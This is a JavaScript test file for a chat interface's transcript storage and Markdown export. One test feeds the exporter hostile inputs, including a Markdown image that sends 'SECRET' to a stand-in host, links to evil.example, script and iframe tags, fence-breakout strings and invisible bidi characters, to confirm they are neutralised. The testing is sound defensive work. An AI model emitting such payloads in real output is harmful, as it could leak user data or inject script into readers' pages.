import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { LEGACY_LOCAL_KEYS, MAX_ITEMS, TRANSCRIPT_KEY, clearTranscript, loadTranscript, normalizeTranscript, purgeLegacyLocalStorage, saveTranscript, transcriptToMarkdown } from '../../ui/transcript.js';

const memoryStorage = () => { const map = new Map(); return { map, getItem: key => map.get(key) ?? null, setItem: (key, value) => { map.set(key, String(value)); }, removeItem: key => { map.delete(key); } }; };
const brokenStorage = { getItem() { throw new Error('SecurityError'); }, setItem() { throw new Error('QuotaExceededError'); }, removeItem() { throw new Error('SecurityError'); } };

test('transcript round-trips through storage and drops junk entries', () => {
  const storage = memoryStorage();
  const items = [{ role: 'user', text: 'hi', at: 1 }, { role: 'assistant', text: '**hello**', at: 2 }, { role: 'tool', name: 'time.now', status: 'ok', text: '', at: 3 }, { role: 'error', text: 'That took too long.', action: 'Press Reset.', code: 'engine_timeout', at: 4 }];
  assert.equal(saveTranscript(storage, items), true);
  assert.deepEqual(loadTranscript(storage), items);
  storage.setItem(TRANSCRIPT_KEY, JSON.stringify({ items: [{ role: 'system', text: 'x' }, null, 'str', { role: 'user', text: 5 }, { role: 'note', text: 'kept', extra: '<script>' }] }));
  assert.deepEqual(loadTranscript(storage), [{ role: 'user', text: '', at: 0 }, { role: 'note', text: 'kept', at: 0 }]);
  storage.setItem(TRANSCRIPT_KEY, '{not json'); assert.deepEqual(loadTranscript(storage), []);
  assert.equal(clearTranscript(storage), true); assert.deepEqual(loadTranscript(storage), []);
});

test('storage failures never throw (private windows, quota, disabled storage)', () => {
  assert.deepEqual(loadTranscript(brokenStorage), []); assert.deepEqual(loadTranscript(null), []);
  assert.equal(saveTranscript(brokenStorage, [{ role: 'user', text: 'x' }]), false);
  assert.equal(clearTranscript(brokenStorage), false);
});

test('stored transcript is bounded by item count and size', () => {
  const storage = memoryStorage();
  saveTranscript(storage, Array.from({ length: MAX_ITEMS + 50 }, (_, index) => ({ role: 'user', text: `m${index}` })));
  const loaded = loadTranscript(storage); assert.equal(loaded.length, MAX_ITEMS); assert.equal(loaded.at(-1).text, `m${MAX_ITEMS + 49}`);
  saveTranscript(storage, Array.from({ length: 60 }, () => ({ role: 'assistant', text: 'x'.repeat(60000) })));
  assert.ok(storage.map.get(TRANSCRIPT_KEY).length <= 1_500_000); assert.ok(loadTranscript(storage).length >= 1);
  assert.equal(normalizeTranscript({ items: [{ role: 'user', text: 'y'.repeat(100000) }] })[0].text.length, 65536);
});

test('export produces Markdown with roles, tool outcomes, and errors', () => {
  const markdown = transcriptToMarkdown([{ role: 'user', text: 'What time is it?' }, { role: 'tool', name: 'time.now', status: 'ok', text: '' }, { role: 'assistant', text: 'It is **noon**.' }, { role: 'error', text: 'That took too long.', action: 'Press Reset.', code: 'engine_timeout' }, { role: 'note', text: 'line one\nline two' }], { exportedAt: new Date('2026-10-03T12:00:00Z') });
  assert.equal(markdown, ['# BMO conversation', '', 'Exported 2026-10-03T12:00:00.000Z from this tab. Messages are shown as literal text, so links and images in them are not loaded.', '', '**You:**', '', '```text', 'What time is it?', '```', '', '> Tool `time.now`: `ok`', '', '**BMO:**', '', '```text', 'It is **noon**.', '```', '', '> Error: That took too long. Press Reset. (code `engine_timeout`)', '', '> line one', '> line two', ''].join('\n'));
});

// A CommonMark-ish oracle for "is this text outside any code block": every
// line that a renderer could interpret must sit between our own fences.
function linesOutsideFences(markdown) {
  const outside = []; let fence = null;
  for (const line of markdown.split('\n')) {
    const match = /^ {0,3}(`{3,}|~{3,})/.exec(line);
    if (fence) { if (match && match[1][0] === fence[0] && match[1].length >= fence.length && line.trim() === match[1]) fence = null; continue; }
    if (match) { fence = match[1]; continue; }
    outside.push(line);
  }
  assert.equal(fence, null, 'every fence is closed'); return outside;
}

test('export never leaves a link, image, autolink, reference definition, or raw HTML live', () => {
  const hostile = [
    '![](https://x.example/?d=SECRET) and ![alt](https://x.example/a.png "t")',
    '[click](https://evil.example/) and [ref link][r1] and ![ref image][r2]',
    '[r1]: https://evil.example/one\n[r2]: <https://evil.example/two.png> "title"',
    'autolinks <https://evil.example/auto> <mailto:a@evil.example> www.evil.example',
    '<img src="https://x.example/i.png"> <script>alert(1)</script> <iframe src=//x.example>',
    'fence breakout:\n```\n![](https://x.example/escaped)\n```\n````\nmore\n````',
    '~~~\n![](https://x.example/tilde)\n~~~',
    'bidi \u202Ecode\u202C and zero\u200Bwidth',
  ];
  for (const text of hostile) {
    const markdown = transcriptToMarkdown([{ role: 'user', text }, { role: 'assistant', text }], { exportedAt: new Date(0) });
    for (const line of linesOutsideFences(markdown)) {
      assert.doesNotMatch(line, /https?:|mailto:|www\.|<[a-z!/]|\]\(|\]\[|^\s*\[[^\]]+\]:/iu, `live content outside a fence: ${line}`);
    }
    assert.doesNotMatch(markdown, /[\u202A-\u202E\u2066-\u2069\u200B-\u200F]/u, 'invisible characters are made visible in the export');
  }
  const exported = transcriptToMarkdown([{ role: 'assistant', text: 'a ```` b' }], { exportedAt: new Date(0) });
  assert.match(exported, /^`````text$/mu, 'the fence is longer than any backtick run inside');
});

test('nothing conversation-related is kept outside this tab, and legacy copies are purged', async () => {
  const local = memoryStorage();
  for (const key of LEGACY_LOCAL_KEYS) local.setItem(key, 'old prompts and answers');
  local.setItem('unrelated', 'keep');
  assert.equal(purgeLegacyLocalStorage(local), LEGACY_LOCAL_KEYS.length);
  assert.deepEqual([...local.map.keys()], ['unrelated']);
  assert.equal(purgeLegacyLocalStorage(brokenStorage), 0); assert.equal(purgeLegacyLocalStorage(null), 0);
  assert.ok(LEGACY_LOCAL_KEYS.includes('bmo.transcript.v1') && LEGACY_LOCAL_KEYS.includes('bmo.ui.remember_transcript'));
  assert.equal(LEGACY_LOCAL_KEYS.includes(TRANSCRIPT_KEY), false, 'the tab key is not mistaken for a legacy key');

  const app = await readFile(new URL('../../ui/app.js', import.meta.url), 'utf8');
  assert.doesNotMatch(app, /localStorage\.(?:setItem|getItem)/u, 'the page never reads or writes localStorage');
  assert.match(app, /function persist\(\) \{ const store = tabStore\(\); if \(store\) saveTranscript\(store, items\); \}/u);
  assert.match(app, /function tabStore\(\) \{ try \{ return sessionStorage; \}/u);
  assert.match(app, /purgeLegacyLocalStorage\(legacyStore\(\)\)/u);
  assert.doesNotMatch(await readFile(new URL('../../ui/index.html', import.meta.url), 'utf8'), /remember/iu);
});

test('reload continuity: the tab store restores what was saved and Reset clears it', () => {
  const tab = memoryStorage();
  saveTranscript(tab, [{ role: 'user', text: 'hello', at: 5 }, { role: 'assistant', text: 'hi', at: 6 }]);
  assert.deepEqual([...tab.map.keys()], [TRANSCRIPT_KEY]);
  assert.deepEqual(loadTranscript(tab), [{ role: 'user', text: 'hello', at: 5 }, { role: 'assistant', text: 'hi', at: 6 }]);
  clearTranscript(tab); assert.deepEqual(loadTranscript(tab), []); assert.equal(tab.map.size, 0);
});
